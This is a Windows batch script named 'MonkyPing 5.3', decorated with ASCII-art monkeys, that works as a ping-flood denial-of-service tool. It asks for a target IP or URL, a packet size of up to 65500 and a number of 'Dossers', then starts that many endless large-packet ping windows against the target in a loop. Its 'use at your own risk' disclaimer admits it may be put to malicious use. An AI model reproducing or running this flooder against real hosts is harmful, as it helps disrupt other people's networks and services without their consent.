@echo off
Title MONKYPING5.3
color 01
echo "==============================================================================="
echo "=                               MONKYPING 5.3                                 ="
echo "==============================================================================="
echo "=                                   __,__                                     ="
echo "=                          .--.  .-"     "-.  .--.                            ="
echo "=                         / .. \/  .-. .-.  \/ .. \                           ="
echo "=                     ^| ^|  '^|  /   Y   \  ^|'  ^| ^|                       ="
echo "=                       ^| \   \  \ 0 ^| 0 /  /   / ^|                        ="
echo "=                         \ '- ,\.-"`` ``"-./, -' /                           ="
echo "=                          `'-' /_   ^ ^   _\ '-'`                            ="
echo "=                             ^|  \._   _./  ^|                               ="
echo "=                              \   \ `~` /   /                                ="
echo "=                               '._ '-=-' _.'                                 ="
echo "=                                  '~---~'                                    ="
echo "==============================================================================="
set /p D= Please enter an IP address or a URL to ping:
 
:START
color 03
cls
echo (Max Amount 65500)
echo.
set /p O= Please Input a Packet Size:
 
cls
color 04
echo ===============================================================================
echo =                          Use At Your Own Risk!                              =
echo ===============================================================================
echo                                                                 
echo Note: OrangeWhip242 and Monkey (the developers of this program) are not responsible for any malicious or otherwise harmful activity that may occur due to the usage of this program. By using MonkyPing, you agree that you are solely liable for any damages done to anyone's computer, source of revenue, or any other belonging. The developers of MonkyPing are not liable for any damages caused by MonkyPing to anyone's system. USE AT YOUR OWN RISK!!!
color 05
echo "==============================================================================="
echo "=                              __------__                                     ="
echo "=                             /~          ~\                                  ="
echo "=                            |    //^\\//^\|                                  ="
echo "=                           /~~\  ||  o| |o|:~\                               ="
echo "=                          | |6   ||___|_|_||:|                               ="
echo "=                          \__.  /      o  \/'                                ="
echo "=                            |   (       O   )                                ="
echo "=                   /~~~~\    `\  \         /                                 ="
echo "=                  | |~~\ |     )  ~------~`\                                 ="
echo "=                 /' |  | |   /     ____ /~~~)\                               ="
echo "=               (_/'   | | |     /'    |    ( |                               ="
echo "=                      | | |     \    /   __)/ \                              ="
echo "=                      \  \ \      \/    /' \   `\                            ="
echo "=                       \  \|\        /   | |\___|                            ="
echo "=                         \ |  \____/     | |                                 ="
echo "=                          /^~>  \        _/ <                                ="
echo "=                          |  |         \       \                             ="
echo "=                          |  | \        \        \                           ="
echo "=                          -^-\  \       |        )                           ="
echo "=                                `\_______/^\______/                          ="
echo "==============================================================================="
color 02
echo (There is no limit, but we don't recommend setting the value too high or else your computer might not be able to handle it.)
echo.
set /p S= How Many Dossers (instances of MonkyPing pinging the ip):
cls
pause

:ping
FOR /L %%S IN (1, 1, %S%) DO start ping %D% -t -l %O%
goto START
